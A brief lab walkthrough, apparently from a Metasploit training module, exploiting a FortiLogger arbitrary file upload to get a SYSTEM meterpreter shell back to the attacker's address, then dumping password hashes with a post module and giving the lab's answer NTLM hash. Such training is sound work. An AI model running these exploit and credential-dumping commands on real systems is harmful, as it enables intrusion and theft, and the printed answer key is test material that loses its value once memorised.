# Module 39 — Using The Metasploit Framework
## Section 11: Meterpreter

**Target:** Windows box running FortiLogger on port 5000

**Exploit chain:**
```
use exploit/windows/http/fortilogger_arbitrary_fileupload
set RHOSTS <target>
set RPORT 5000
set LHOST <your-tun0-ip>
exploit
```
Gives a SYSTEM meterpreter shell.

**Dump credentials:**
```
use post/windows/gather/hashdump
set SESSION <session-id>
run
```

**Answer (htb-student NTLM hash):** `cf3a5525ee9414229e66279623ed5c58`

### Note
`sessions -c <cmd>` only runs real OS binaries — meterpreter built-ins like `getuid`/`hashdump` need the matching `post/` module with `SESSION` set, not `sessions -c`.
